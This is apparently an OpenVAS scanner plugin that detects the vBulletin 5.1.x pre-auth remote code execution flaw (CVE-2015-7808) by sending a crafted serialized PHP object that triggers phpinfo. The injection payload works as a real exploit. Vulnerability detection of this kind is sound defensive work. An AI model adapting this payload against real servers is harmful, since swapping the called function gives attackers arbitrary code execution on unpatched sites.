###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vbulletin_rce_11_15.nasl 6470 2017-06-28 15:19:44Z cfischer $
#
# vBulletin PreAuth Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105447");
  script_version("$Revision: 6470 $");
  script_cve_id("CVE-2015-7808");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-06-28 17:19:44 +0200 (Wed, 28 Jun 2017) $");
  script_tag(name:"creation_date", value:"2015-11-10 18:30:30 +0100 (Tue, 10 Nov 2015)");
  script_name("vBulletin PreAuth Remote Code Execution");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("vbulletin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("vBulletin/installed");

  script_xref(name:"URL", value:"http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/4332166-security-patch-release-for-vbulletin-5-connect-versions-5-1-4-through-5-1-9");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to inject and execute arbitrary code within the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response");

  script_tag(name:"solution", value:"Vendor has released security patches.");

  script_tag(name:"summary", value:"vBulletin is prone to a remote code-injection vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"affected", value:"vBulletin 5.1.4, 5.1.5, 5.1.6, 5.1.7, 5.1.8 and 5.1.9");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("url_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

foreach db( make_list( "vB_Database_MySQLi", "vB_Database" ) ) {

  db_len = strlen( db );
  cmd = 'phpinfo';
  cmd_len = strlen( cmd );

  ser = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:' + db_len  + ':"' + db  + '":1:{s:9:"functions";a:1:{s:11:"free_result";s:' + cmd_len  + ':"' + cmd + '";}}s:12:"*recordset";i:1;}';

  ser = urlencode( str:ser );
  ser = str_replace( string:ser, find:'*', replace:'%00%2a%00' );

  url = dir + '/ajax/api/hook/decodeArguments?arguments=' + ser;

  if( http_vuln_check( port:port, url:url, pattern:'<title>phpinfo\\(\\)</title>' ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
